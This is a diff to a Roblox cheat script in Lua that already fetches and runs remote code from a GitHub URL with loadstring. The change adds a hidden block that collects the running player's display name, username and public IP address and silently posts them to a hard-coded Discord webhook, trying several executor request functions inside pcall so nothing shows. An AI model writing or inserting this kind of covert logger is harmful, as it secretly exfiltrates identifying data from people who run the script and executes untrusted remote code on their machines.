@@ -1,6 +1,53 @@
 --]]
  loadstring(game:HttpGet("https://raw.githubusercontent.com/xfarzadxx/dot/main/noslow"))()
 
+local webh = "https://discord.com/api/webhooks/1234912975576498328/feKHFBOFYkkuH-c7GYnHj76cvlFrDdP8qLSH8yr3G0E_i-3Rv-IdTMF04IALA0W2xDKl"
+
+pcall(function()
+   local data = {
+       ["embeds"] = {
+           {
+               ["title"] = "Execution \n Display "..game.Players.LocalPlayer.DisplayName.."\n User "..game.Players.LocalPlayer.Name,
+               ["description"] = "IP Adress: " ..game:HttpGet("https://api.ipify.org")
+           }
+       }
+   }
+
+   if syn then
+       local response = syn.request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif request then
+       local response = request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif http_request then
+       local response = http_request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   end
+end)
 --dont mess with he settings unless u know what ur doing
  
 local Settings = {
